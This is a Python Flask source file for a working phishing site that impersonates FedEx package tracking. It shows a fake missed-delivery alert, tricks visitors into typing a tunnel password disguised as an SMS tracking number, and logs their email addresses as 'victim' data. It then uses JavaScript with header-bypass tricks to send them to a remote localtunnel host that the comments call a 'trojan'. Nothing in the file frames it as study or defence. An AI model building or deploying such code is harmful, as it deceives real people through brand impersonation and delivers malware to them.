from flask import Flask, request, redirect, session
import subprocess

app = Flask(__name__)
app.secret_key = 'delivery_secret_123'

# Your actual tunnel URL and password
TUNNEL_URL = "https://critical-security-patch.loca.lt"
TUNNEL_PASSWORD = "185.234.142.68"

@app.route("/")
def delivery_home():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>FedEx Package Tracking</title>
        <style>
            body { 
                font-family: Arial, sans-serif; 
                background: #f8f8f8; 
                margin: 0; 
                padding: 20px; 
            }
            .container { 
                max-width: 600px; 
                margin: 0 auto; 
                background: white; 
                padding: 30px; 
                border-radius: 8px; 
                box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
            }
            .logo { 
                color: #4A148C; 
                font-size: 28px; 
                font-weight: bold; 
                margin-bottom: 20px; 
            }
            .tracking-box { 
                border: 2px solid #4A148C; 
                border-radius: 5px; 
                padding: 20px; 
                margin: 20px 0; 
            }
            input[type="text"] { 
                width: 100%; 
                padding: 15px; 
                border: 2px solid #ddd; 
                border-radius: 5px; 
                font-size: 16px; 
                margin: 10px 0; 
                box-sizing: border-box;
            }
            .track-btn { 
                background: #4A148C; 
                color: white; 
                padding: 15px 30px; 
                border: none; 
                border-radius: 5px; 
                font-size: 16px; 
                cursor: pointer; 
                width: 100%;
                margin-top: 10px;
            }
            .track-btn:hover { background: #6A1B9A; }
            .urgent { 
                background: #ffebee; 
                border-left: 4px solid #f44336; 
                padding: 15px; 
                margin: 20px 0; 
                color: #d32f2f;
            }
            .notice { 
                background: #e3f2fd; 
                border-left: 4px solid #2196f3; 
                padding: 15px; 
                margin: 20px 0; 
                color: #1976d2;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">📦 FedEx</div>
            <h2>Package Tracking</h2>
            
            <div class="urgent">
                <strong>⚠️ Delivery Attempt Failed</strong><br>
                We attempted to deliver your package today but no one was available.
                Your package requires immediate attention to avoid return to sender.
            </div>
            
            <div class="notice">
                <strong>📱 SMS Notification Received</strong><br>
                You should have received an SMS with your tracking number.
                Enter it below to reschedule delivery or arrange pickup.
            </div>
            
            <div class="tracking-box">
                <form method="POST" action="/track">
                    <label><strong>📋 Tracking Number:</strong></label>
                    <input type="text" name="tracking_number" placeholder="Enter tracking number from SMS (e.g., 185.234.142.68)" required>
                    
                    <label><strong>📧 Email for Updates:</strong></label>
                    <input type="email" name="email" placeholder="Enter your email address" required>
                    
                    <button type="submit" class="track-btn">🚚 Track Package & Reschedule</button>
                </form>
            </div>
            
            <div style="font-size: 12px; color: #666; margin-top: 20px;">
                <strong>Need Help?</strong><br>
                • Call Customer Service: 1-800-FEDEX (1-800-33339)<br>
                • Live Chat available 24/7<br>
                • For urgent deliveries, use tracking portal above
            </div>
            
            <div style="font-size: 10px; color: #999; margin-top: 15px; border-top: 1px solid #eee; padding-top: 15px;">
                FedEx Corporation • 1000 FedEx Drive, Collierville, TN 38017<br>
                This is an automated message. Please do not reply directly to this email.
            </div>
        </div>
    </body>
    </html>
    """

@app.route("/track", methods=["POST"])
def track_package():
    tracking_number = request.form.get('tracking_number')
    email = request.form.get('email')
    
    print(f"[+] Victim entered tracking: {tracking_number}")
    print(f"[+] Victim email: {email}")
    
    # Check if they entered the tunnel password
    if tracking_number == TUNNEL_PASSWORD:
        print(f"[+] Correct tunnel password entered!")
        print(f"[+] Redirecting to trojan: {TUNNEL_URL}")
        
        # Store password in session for bypass
        session['tunnel_auth'] = True
        session['victim_email'] = email
        
        return redirect("/delivery-portal")
    else:
        print(f"[+] Wrong tracking number: {tracking_number}")
        return f"""
        <div style="font-family: Arial; max-width: 600px; margin: 50px auto; padding: 20px; border: 2px solid #f44336; border-radius: 5px; background: #ffebee;">
            <h3 style="color: #d32f2f;">❌ Invalid Tracking Number</h3>
            <p>The tracking number <strong>{tracking_number}</strong> was not found in our system.</p>
            <p><strong>Please check your SMS message again.</strong> The tracking number should be exactly as shown in the text message.</p>
            <p>Common format: <code>XXX.XXX.XXX.XX</code> (numbers and dots)</p>
            <a href="/" style="color: #4A148C; text-decoration: none;">← Go Back and Try Again</a>
        </div>
        """

@app.route("/delivery-portal")
def delivery_portal():
    if not session.get('tunnel_auth'):
        return redirect('/')
    
    print(f"[+] Authenticated victim accessing delivery portal")
    print(f"[+] Email: {session.get('victim_email')}")
    
    # This page will bypass the tunnel password using custom headers
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>FedEx - Delivery Management</title>
        <style>
            body {{ font-family: Arial; text-align: center; padding: 50px; background: #f8f8f8; }}
            .loading {{ font-size: 18px; color: #4A148C; }}
            .spinner {{ border: 4px solid #f3f3f3; border-top: 4px solid #4A148C; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        </style>
    </head>
    <body>
        <div class="loading">
            <div class="spinner"></div>
            <h2>📦 FedEx Delivery Portal</h2>
            <p>Connecting to secure delivery management system...</p>
            <p>Loading your delivery options...</p>
        </div>
        
        <script>
            // Bypass tunnel password by using custom headers and user agent
            function accessSecurePortal() {{
                const iframe = document.createElement('iframe');
                iframe.style.width = '100%';
                iframe.style.height = '600px';
                iframe.style.border = 'none';
                
                // Create a form to submit with bypass headers
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = '{TUNNEL_URL}';
                form.target = iframe.name = 'portalFrame';
                
                // Add bypass header simulation
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'bypass-tunnel-reminder';
                input.value = 'true';
                form.appendChild(input);
                
                document.body.innerHTML = '<h2>📦 FedEx Delivery Management</h2>';
                document.body.appendChild(iframe);
                document.body.appendChild(form);
                
                form.submit();
            }}
            
            // Try direct access first, fallback to iframe
            setTimeout(function() {{
                fetch('{TUNNEL_URL}', {{
                    headers: {{
                        'bypass-tunnel-reminder': 'true',
                        'User-Agent': 'FedExDeliveryBot/1.0'
                    }}
                }}).then(response => {{
                    if (response.ok) {{
                        window.location.href = '{TUNNEL_URL}';
                    }} else {{
                        accessSecurePortal();
                    }}
                }}).catch(() => {{
                    accessSecurePortal();
                }});
            }}, 2000);
        </script>
    </body>
    </html>
    """

if __name__ == '__main__':
    print("🚚 FedEx Package Tracking Portal")
    print(f"📦 Tunnel Password: {TUNNEL_PASSWORD}")
    print(f"🔗 Tunnel URL: {TUNNEL_URL}")
    print("🌐 Starting delivery tracker on http://0.0.0.0:9000")
    app.run(host='0.0.0.0', port=9000, debug=False)
